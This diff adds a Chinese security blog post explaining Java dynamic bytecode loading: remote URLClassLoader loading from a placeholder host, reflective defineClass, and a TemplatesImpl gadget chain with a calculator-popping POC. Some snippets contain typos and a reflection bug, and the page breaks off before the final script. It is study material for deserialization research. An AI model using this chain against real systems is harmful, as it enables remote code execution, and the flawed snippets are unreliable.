@@ -1,0 +1,1265 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  
+  <title itemprop="name">java动态加载字节码 | baicany</title>
+  
+    <link rel="shortcut icon" href="favicon.ico">
+  
+  <meta http-equiv="x-dns-prefetch-control" content="on">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
+  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
+  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/lib.min.css" media="all">
+  <link rel="stylesheet" href="/css/font.css" media="all">
+  <link rel="stylesheet" href="/css/insight.css" media="all">
+  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
+  <link rel="stylesheet" href="/css/zoom.css" media="all">
+  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
+" type="text/css" media="all"> -->
+  <script>
+  /*Initial Variables*/
+  var mashiro_option = new Object();
+  var mashiro_global = new Object();
+  mashiro_option.NProgressON = true;
+  /* 
+   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
+   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
+   */
+  mashiro_option.email_domain = "";
+  mashiro_option.email_name = "";
+  mashiro_option.cookie_version_control = "";
+  mashiro_option.qzone_autocomplete = false;
+  mashiro_option.site_name = "baicanのy";
+  mashiro_option.author_name = "y";
+  mashiro_option.site_url = "https://baicany.github.io";
+  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
+  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
+  mashiro_option.mathjax = "1";
+  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
+  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";
+
+  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
+  // mashiro_option.float_player_on = true;
+
+  /*End of Initial Variables*/
+  </script>
+  <script type="text/javascript">
+  var bg = "https://baicany.github.io/images/136.jpg,https://baicany.github.io/images/12.jpg,https://baicany.github.io/images/36.jpg,https://baicany.github.io/images/s7.png,https://baicany.github.io/images/s12.png,https://baicany.github.io/images/s19.jpg,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(5).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(6).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(7).jpg.webp,https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/cover/(8).jpg.webp".split(",");
+  var bgindex = Math.floor(Math.random()*bg.length);
+  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
+    alert('朋友，IE浏览器未适配哦~');
+  }
+  </script>
+  <style type="text/css">
+  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
+  </style>
+  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
+  </style>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
+  <div class="scrollbar" id="bar">
+  </div>
+  <a href="#" class="cd-top faa-float animated"></a>
+  <section id="main-container">
+    <div class="headertop filter-dot">
+  <div id="banner_wave_1"></div>
+  <div id="banner_wave_2"></div>
+  <figure id="centerbg" class="centerbg">
+    <div class="focusinfo no-select">
+      <div class="header-tou">
+        <a href="https://baicany.github.io">
+          <img src="https://baicany.github.io/images/head.jpg">
+        </a>
+      </div>
+      <div class="header-info">
+        <p>故乡的樱花开了嘛</p>
+        <div class="top-social_v2">
+          <li id="bg-pre">
+            <img class="flipx" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+          
+          <li id="bg-next">
+            <img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/other/next-b.svg">
+          </li>
+        </div>
+      </div>
+    </div>
+  </figure>
+  <div id="video-container" style="">
+    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
+    </video>
+    <div id="video-btn" class="loadvideo videolive">
+    </div>
+    <div id="video-add">
+    </div>
+    <div class="video-stu">
+    </div>
+  </div>
+  <div class="headertop-down faa-float animated" onclick="headertop_down()">
+    <span>
+      <i class="fa fa-chevron-down" aria-hidden="true">
+      </i>
+    </span>
+  </div>
+</div>
+    <div id="page" class="site wrapper">
+      <header class="site-header no-select gizle sabit" role="banner">
+  <div class="site-top">
+    <div class="site-branding">
+      <span class="site-title">
+        <span class="logolink moe-mashiro">
+          <a href="/">
+            <span class="sakurasono">baicanの</span>
+            <span class="shironeko">y</span>
+          </a>
+        </span>
+      </span>
+    </div>
+    <div class="searchbox search-form-submit">
+      <i class="iconfont js-toggle-search iconsearch icon-search">
+      </i>
+    </div>
+    <div id="show-nav" class="showNav mobile-fit">
+      <div class="line line1">
+      </div>
+      <div class="line line2">
+      </div>
+      <div class="line line3">
+      </div>
+    </div>
+    <div class="lower-cantiner">
+      <div class="lower">
+        <nav class="mobile-fit-control hide">
+          <ul id="menu-new" class="menu">
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
+                    首页
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/archives">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
+                    归档
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          学习记录
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/ctf%E8%AE%B0%E5%BD%95/">
+                          <i class="fa fa-code" aria-hidden="true"></i>
+                          ctf记录
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/categories/%E6%9D%82%E4%BA%8B/">
+                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
+                          杂事
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+              <li>
+                <a href="/links/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
+                    友人帐
+                  </span>
+                </a>
+                
+              </li>
+            
+              <li>
+                <a href="/">
+                  <span class="faa-parent animated-hover">
+                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
+                    关于
+                  </span>
+                </a>
+                
+                  <ul class="sub-menu">
+                    
+                      <li>
+                        <a href="/about/">
+                          <i class="fa fa-meetup" aria-hidden="true"></i>
+                          我？
+                        </a>
+                      </li>
+                    
+                      <li>
+                        <a href="/theme-sakura/">
+                          <i class="fa iconfont icon-sakura" aria-hidden="true"></i>
+                          主题
+                        </a>
+                      </li>
+                    
+                  </ul>
+                
+              </li>
+            
+          </ul>
+        </nav>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://baicany.github.io/images/a14.jpg);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/a14.jpg">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      java动态加载字节码</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="https://baicany.github.io/images/head.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="">baicany</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2023-7-12<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
+    </header>
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="Java-动态加载字节码"><a href="#Java-动态加载字节码" class="headerlink" title="Java 动态加载字节码"></a>Java 动态加载字节码</h1><h3 id="字节码"><a href="#字节码" class="headerlink" title="字节码"></a>字节码</h3><p>Java字节码指的是JVM执⾏使⽤的⼀类指令，通常被存储在 .class ⽂件中 </p>
+<p>P神的定义：</p>
+<p><img src="https://baicany.github.io/iamges/1241235.jpg" alt="在这里插入图片描述"></p>
+<h3 id="利⽤URLClassLoader加载远程-本地class⽂件"><a href="#利⽤URLClassLoader加载远程-本地class⽂件" class="headerlink" title="利⽤URLClassLoader加载远程/本地class⽂件"></a>利⽤URLClassLoader加载远程/本地class⽂件</h3><p>在学习完类加载机制，URLClassLoader是AppClassLoader的⽗类 正常情况下(扩展类加载器)，Java会根据配置项sun.boot.class.path和java.class.path中列举的基础路径（这些路径是经过处理后的java.net.URL类） 来寻找 .class ⽂件来加载，这个基础路径有分三种情况：  </p>
+<ul>
+<li><p>URL未以斜杠 / 结尾，则认为是⼀个Jar⽂件，使⽤JarLoader来寻找类，即在Jar包上寻找类，不以就会认为该 URL 被假定为引用将根据需要打开的 JAR 文件。</p>
+</li>
+<li><p>URL以斜杠 / 结尾，且协议名为file，则使⽤FileLoader来寻找类，即在本地系统中寻找 .class ⽂件 </p>
+</li>
+<li><p> URL以斜杠 / 结尾，且协议名不为file，则使⽤最基础的Loader来寻找类</p>
+</li>
+</ul>
+<h3 id="本地加载-class-⽂件"><a href="#本地加载-class-⽂件" class="headerlink" title="本地加载 .class ⽂件"></a>本地加载 .class ⽂件</h3><pre><code class="java">import java.net.URL;
+import java.net.URLClassLoader; 
+public class urlclassloader &#123; public static void main(String[] args) throws Exception &#123; 
+    URLClassLoader urlclassloader = new URLClassLoader(new URL[]&#123;
+        new URL(&quot;file:///Users/nivia/Desktop/Java/src/&quot;)&#125;); 
+    Class c = urlclassloader.loadClass(&quot;Test&quot;); c.newInstance(); &#125; &#125; 
+</code></pre>
+<h3 id="远程加载-class-⽂件"><a href="#远程加载-class-⽂件" class="headerlink" title="远程加载 .class ⽂件"></a>远程加载 .class ⽂件</h3><pre><code class="java">import java.net.URL; 
+import java.net.URLClassLoader; 
+public class urlclassloader &#123; 
+    public static void main(String[] args) throws Exception &#123;
+        URLClassLoader urlclassloader = new URLClassLoader(new URL[]&#123;new URL(&quot;http://url:port/&quot;)&#125;); 
+        Class c = urlclassloader.loadClass(&quot;Test&quot;); c.newInstance(); &#125; &#125; 
+</code></pre>
+<p>加载到的 .class ⽂件会执⾏其字节码 当能够控制⽬标Java ClassLoader的基础路径为⼀个http服务器，则可以⽤远程加载的⽅式执⾏任意代码</p>
+<h3 id="利用defineClass直接加载字节码"><a href="#利用defineClass直接加载字节码" class="headerlink" title="利用defineClass直接加载字节码"></a>利用defineClass直接加载字节码</h3><p>Java加载都需要经过：</p>
+<pre><code class="java">ClassLoader.loadClass -&gt; ClassLoader.findClass -&gt; ClassLoader.defineClass
+</code></pre>
+<ul>
+<li>loadClass的作⽤是从已经加载的类缓存、⽗加载器等位置寻找类（双亲委派机制），在前⾯没有找到的情况下，执⾏findClass </li>
+<li>findClass的作⽤就是根据基础URL制定的⽅式来查找类，读取字节码后交给defineClass</li>
+</ul>
+<p>defineClass的作⽤是处理前⾯传⼊的字节码，将其处理成真正的Java类</p>
+<p>所以真正核心的部分其实是 <code>defineClass</code></p>
+<p>至于再具体的<code>defineClass()</code>方法是如何实现的，就要跟到这个native(本地)方法了：</p>
+<pre><code class="java">native方法称为本地方法。在java源程序中以关键字“native”声明，不提供函数体。
+其实现使用C/C++语言在另外的文件中编写，编写的规则遵循Java本地接口的规范(简称JNI)。
+简而言就是Java中声明的可调用的使用C/C++实现的方法。
+</code></pre>
+<pre><code class="java">protected final Class&lt;?&gt; defineClass(String name, byte[] b, int off, int len,ProtectionDomain protectionDomain)    throws ClassFormatError
+    &#123;
+        ....
+        Class&lt;?&gt; c = defineClass1(name, b, off, len, protectionDomain, source);
+        postDefineClass(c, protectionDomain);
+        return c;
+    &#125;
+8private native Class&lt;?&gt; defineClass1(String name, byte[] b, int off, int len,ProtectionDomain pd, String source);
+</code></pre>
+<p>例子：</p>
+<pre><code class="java">package org.gk0d;
+
+import java.lang.reflect.Method;
+import java.util.Base64;
+
+public class HelloDefineClass &#123;
+    public static void main(String[] args) throws Exception &#123;
+        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, String.class, byte[].class, int.class, int.class);
+        defineClass.setAccessible(true);
+        byte[] code = Base64.getDecoder().decode(&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEA&quot;+
+                        &quot;Bjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVs&quot;+
+                        &quot;bG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZh&quot;+
+                        &quot;L2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3Ry&quot;+
+                        &quot;ZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5n&quot;+
+                        &quot;OylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoA&quot;+
+                        &quot;AAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;);
+        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), &quot;Hello&quot;, code,0, code.length);
+        hello.newInstance();
+    &#125;
+&#125;
+//ClassLoader.getSystemClassLoader()返回系统的类加载器对象
+</code></pre>
+<p>里面是<code>Hello.class</code>的base64编码</p>
+<p>注意：在 <code>defineClass</code> 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造<br>函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中，在 defineClass 时也无法被直接调用到。所以，如果我们要使用 defineClass 在目标机器上执行任意代码，需要想办法调用构造函数。详细可以看类的加载过程</p>
+<p>在实际场景中，因为<code>defineClass</code>方法作用域是不开放的，所以攻击者很少能直接利用到它但它却是我们常用的一个攻击链 <code>TemplatesImpl</code> 的基石。</p>
+<p>还可以用IO进行文件读取</p>
+<pre><code class="java">import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+import java.lang.reflect.Method;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+
+public class DefineClassTest &#123;
+    public static void main(String[] args) throws IOException, ClassNotFoundException, IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException, InvocationTargetException &#123;
+        Method defineClass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,String.class,byte[].class,int.class,int.class);
+        defineClass.setAccessible(true);
+        byte[] code= Files.readAllBytes(Paths.get(&quot;D:\Exec.class&quot;));
+        Class Exec = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(),&quot;Exec&quot;,code,0,code.length);
+        Exec.newInstance();
+    &#125;
+&#125;
+</code></pre>
+<h1 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h1><p><code>defineClass</code>方法并不好直接利用，但是Java底层还是有一些类用到了它，这就是 <code>TemplatesImpl</code> ,<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<code>TransletClassLoader</code>：</p>
+<pre><code class="java">static final class TransletClassLoader extends ClassLoader &#123;
+    private final Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;
+
+     TransletClassLoader(ClassLoader parent) &#123;
+         super(parent);
+        _loadedExternalExtensionFunctions = null;
+    &#125;
+
+    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;
+        super(parent);
+        _loadedExternalExtensionFunctions = mapEF;
+    &#125;
+
+    public Class&lt;?&gt; loadClass(String name) throws ClassNotFoundException &#123;
+        Class&lt;?&gt; ret = null;
+        // The _loadedExternalExtensionFunctions will be empty when the
+        // SecurityManager is not set and the FSP is turned off
+        if (_loadedExternalExtensionFunctions != null) &#123;
+            ret = _loadedExternalExtensionFunctions.get(name);
+        &#125;
+        if (ret == null) &#123;
+            ret = super.loadClass(name);
+        &#125;
+        return ret;
+     &#125;
+    /**
+     * Access to final protected superclass member from outer class.
+     */
+    Class defineClass(final byte[] b) &#123;
+        return defineClass(null, b, 0, b.length);
+    &#125;
+&#125;
+</code></pre>
+<p>这个类里重写了 <code>defineClass</code> 方法，并且这里没有显式地声明其定义域。Java中默认情况下，如果一个方法没有显式声明作用域，其作用域为<code>default</code>。所以也就是说这里的<code>defineClass</code> 由其父类的<code>protected</code>类型变成了一个<code>default</code>类型的方法，可以被类外部调用。</p>
+<p>从 <code>TransletClassLoader#defineClass()</code> 向前追溯一下调用链:</p>
+<pre><code class="java">TransletClassLoader#defineClass() 
+-&gt; TemplatesImpl#defineTransletClasses() 
+-&gt; TemplatesImpl#getTransletInstance() 
+-&gt; TemplatesImpl#newTransformer() 
+-&gt; TemplatesImpl#getOutputProperties()
+</code></pre>
+<p>重点来了怎么利用defineClass() 的呢怎么找的的</p>
+<p>搜索defineClass() 发现在defineTransletClasses() 中调用了</p>
+<p>看<code>TemplatesImpl#defineTransletClasses()</code>方法</p>
+<pre><code class="java">private void defineTransletClasses()
+        throws TransformerConfigurationException &#123;
+    
+        if (_bytecodes == null) &#123;//记住这个条件
+            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
+            throw new TransformerConfigurationException(err.toString());
+        &#125;
+
+        TransletClassLoader loader = (TransletClassLoader)
+            AccessController.doPrivileged(new PrivilegedAction() &#123;
+                public Object run() &#123;
+                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
+                &#125;
+            &#125;);
+
+        try &#123;
+            final int classCount = _bytecodes.length;
+            _class = new Class[classCount];
+
+            if (classCount &gt; 1) &#123;
+                _auxClasses = new HashMap&lt;&gt;();
+            &#125;
+
+            for (int i = 0; i &lt; classCount; i++) &#123;
+                _class[i] = loader.defineClass(_bytecodes[i]);
+                //在这里调用了defineClass
+                final Class superClass = _class[i].getSuperclass();
+
+                // Check if this is the main class
+                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;
+                    _transletIndex = i;
+                &#125;
+                else &#123;
+                    _auxClasses.put(_class[i].getName(), _class[i]);
+                &#125;
+            &#125;
+
+            if (_transletIndex &lt; 0) &#123;
+                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
+                throw new TransformerConfigurationException(err.toString());
+            &#125;
+        &#125;
+    ...
+    &#125;
+</code></pre>
+<pre><code class="java">for (int i = 0; i &lt; classCount; i++) &#123;
+    _class[i] = loader.defineClass(_bytecodes[i]);
+</code></pre>
+<pre><code class="java">    private byte[][] _bytecodes = null;
+</code></pre>
+<p>这⾥的<code>_bytecodes</code>定义是私有的也没其他搜索也没其他方法修改他，所以，可利⽤反射获取变量进⾏修改 还需要注意，defineTransletClasses⽅法中会执⾏⼀个run⽅法,为了防止报错所以_tfactory不能为空还得为TransformerFactoryImpl对象</p>
+<pre><code class="java">private transient TransformerFactoryImpl _tfactory = null;
+</code></pre>
+<p>继续看哪里用了这个defineTransletClasses() 方法,搜索发现有三个</p>
+<pre><code class="java">// 第一个
+    public synchronized int getTransletIndex() &#123;
+        try &#123;
+            if (_class == null) defineTransletClasses();
+        &#125;
+        catch (TransformerConfigurationException e) &#123;
+            // Falls through
+        &#125;
+        return _transletIndex;
+    &#125;
+//第二个
+    private synchronized Class[] getTransletClasses() &#123;
+        try &#123;
+            if (_class == null) defineTransletClasses();
+        &#125;
+        catch (TransformerConfigurationException e) &#123;
+            // Falls through
+        &#125;
+        return _class;
+    &#125;
+//第三个
+    private Translet getTransletInstance()
+        throws TransformerConfigurationException &#123;
+        try &#123;
+            if (_name == null) return null;
+
+            if (_class == null) defineTransletClasses();
+
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet)                   _class[_transletIndex].getConstructor().newInstance();
+            translet.postInitialization();
+            translet.setTemplates(this);
+            translet.setOverrideDefaultParser(_overrideDefaultParser);
+            translet.setAllowedProtocols(_accessExternalStylesheet);
+            if (_auxClasses != null) &#123;
+                translet.setAuxiliaryClasses(_auxClasses);
+            &#125;
+
+            return translet;
+        &#125;
+....
+    &#125;
+</code></pre>
+<p>第一个方法为public可以直接调用  之后再说</p>
+<p>第二个方法为私有所以往上调看看什么能用它,没有,那没办了</p>
+<p>第三方法往上调用发现newTransformer()是个public可以调用了</p>
+<pre><code class="java">    public synchronized Transformer newTransformer()
+        throws TransformerConfigurationException
+    &#123;
+        TransformerImpl transformer;
+
+        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
+            _indentNumber, _tfactory);//在这里
+
+        if (_uriResolver != null) &#123;
+            transformer.setURIResolver(_uriResolver);
+        &#125;
+
+        if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;
+            transformer.setSecureProcessing(true);
+        &#125;
+        return transformer;
+    &#125;
+</code></pre>
+<p>所以我们可以实例化TemplatesImpl对象直接调用它的方法就能弹计算器了</p>
+<p>找到链子了所以跟进去看看条件是什么,方便就直接写进入方法前的代码块了</p>
+<pre><code class="java">// newTransformer()方法中进入下一个方法并不需要条件继续
+&#123;            
+        TransformerImpl transformer;
+        transformer = new TransformerImpl(getTransletInstance(), _outputProperties,_indentNumber, _tfactory);&#125;
+        
+getTransletInstance()方法
+try &#123;
+            if (_name == null) return null;//name不能为null
+
+            if (_class == null) defineTransletClasses();
+// 所以这里_class==null才行           继续跟进
+&#123;
+        if (_bytecodes == null) &#123;
+            ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
+throw new TransformerConfigurationException(err.toString());
+        &#125;
+
+        TransletClassLoader loader = (TransletClassLoader)
+            AccessController.doPrivileged(new PrivilegedAction() &#123;
+                public Object run() &#123;
+                    return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
+                &#125;
+            &#125;);
+//发现在这里需要一个条件_tfactory前面说过的
+        try &#123;
+            final int classCount = _bytecodes.length;
+            _class = new Class[classCount];
+
+            if (classCount &gt; 1) &#123;
+                _auxClasses = new HashMap&lt;&gt;();
+            &#125;
+
+            for (int i = 0; i &lt; classCount; i++) &#123;
+                _class[i] = loader.defineClass(_bytecodes[i]);
+        final Class superClass = _class[i].getSuperclass();
+                //虽然到这就结束了
+                // Check if this is the main class
+                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;
+                    _transletIndex = i;
+                &#125;  
+                //之后的会说这里要求class是AbstractTranslet的子类之后说
+</code></pre>
+<p>问题是怎么控制这些变量，发现都是私有类,且没有构造方法,所以只能用反射了</p>
+<pre><code class="java">   private Class[] _class = null;
+   private byte[][] _bytecodes = null;
+   private String _name = null;
+   private transient TransformerFactoryImpl _tfactory = null;
+</code></pre>
+<p>所以构造</p>
+<pre><code class="java">//不用运行,理解下,为什么之后说
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import java.lang.reflect.Field;
+import java.util.Base64;
+
+public class Main &#123;
+    public static void main(String[] args) throws Exception &#123;
+        byte[] bytecodes = Base64.getDecoder().decode(&quot;xxxx&quot;);
+        TemplatesImpl mpl =new TemplatesImpl();
+        Class a = mpl.getClass();
+        setFieldValue(a,&quot;_name&quot;,&quot;baicany&quot;);
+        setFieldValue(a,&quot;_bytecodes&quot;,bytecodes);
+        setFieldValue(a,&quot;_class&quot;,null);
+        setFieldValue(a,&quot;_tfactory&quot;,new TransformerFactoryImpl());
+        mpl.newTransformer();
+    &#125;
+    public static void setFieldValue(Class a,String name,Object value) throws Exception &#123;
+        Field field = a.getDeclaredField(name);
+        field.setAccessible(true);
+        field.set(a,value);
+    &#125;
+&#125;
+</code></pre>
+<p>可是之前那样这样只是加载了字节码并不会初始化怎么办，就像之前提到过一样</p>
+<p>在getTransletInstance()方法中运行了defineTransletClasses()之后会newInstance();还是要这里的实例化才有用,就是这里就能触发我们之前加载的字节码了</p>
+<pre><code class="java">   private Translet getTransletInstance()
+        throws TransformerConfigurationException &#123;
+        try &#123;
+            if (_name == null) return null;
+
+            if (_class == null) defineTransletClasses();
+
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet)
+                 _class[_transletIndex].getConstructor().newInstance();
+            //_class[_transletIndex]所以这个必须得有
+</code></pre>
+<p>所以要确保进入defineTransletClasses()并不会报错所以得看完defineTransletClasses()里面写的什么,这里函数之前分析过的不再分析了</p>
+<pre><code class="java"> //说过_class[_transletIndex]这个必须要有才能实例化,先看确保进入方法是对的再说不然会出问题
+  for (int i = 0; i &lt; classCount; i++) &#123;
+        _class[i] = loader.defineClass(_bytecodes[i]);
+                final Class superClass = _class[i].getSuperclass();
+                // Check if this is the main class
+                if (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;
+                    _transletIndex = i;
+                &#125;
+                就是说的
+                else &#123;
+                    _auxClasses.put(_class[i].getName(), _class[i]);
+                &#125;
+            &#125;
+
+            if (_transletIndex &lt; 0) &#123;
+                ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
+                throw new TransformerConfigurationException(err.toString());
+            &#125;
+        &#125;
+    &#125;
+</code></pre>
+<p>首先想要不报错if (_transletIndex &lt; 0)必须为flase,所以往上看,发现赋值语句</p>
+<p><code>_transletIndex = i;</code>这里和之前提到的撞上了是吧,只要这个有那之前那个（<code>_class[_transletIndex]</code>）也解决了，在往上看要这个要赋值得</p>
+<pre><code class="JAVA"> if (superClass.getName().equals(ABSTRACT_TRANSLET)) 为true才行
+ 而这里superclass为Class superClass = _class[i].getSuperclass();
+_class[i]怎么来的之前也知道了所以直接都串上了
+</code></pre>
+<p>所以条件要_bytecodes[i]的父类为AbstractTranslet才行</p>
+<pre><code class="java"> private static String ABSTRACT_TRANSLET
+        = &quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;;
+</code></pre>
+<p>至于外部加载类怎么写的弹计算器</p>
+<p>POC:</p>
+<pre><code class="java">import java.io.IOException;
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+public class io extends AbstractTranslet &#123;
+    public io() throws IOException &#123;
+        Runtime.getRuntime().exec(&quot;cacl&quot;);
+    &#125;
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;
+    &#125;
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;
+    &#125;
+&#125;
+</code></pre>
+<p>解释以下为什么多了两个transform方法,然后将它编译+base64编码了</p>
+<pre><code class="java">这里是因为子类需要实现父类里面的抽象方法，同时因为父类是抽象类，可能没有将接口的方法全部实现，
+这时子类如果不是抽象的，那必须将其他接口方法都实现。
+这里面 `transform(DOM document, DTMAxisIterator iterator,SerializationHandler handler)
+是父类里面的抽象方法所以要重写
+transform(DOM document, SerializationHandler[] handlers)是父类没有实现接口的方法所以要重写
+</code></pre>
+<pre><code class="java">//脚本献上
+package com.lagou;
+
+
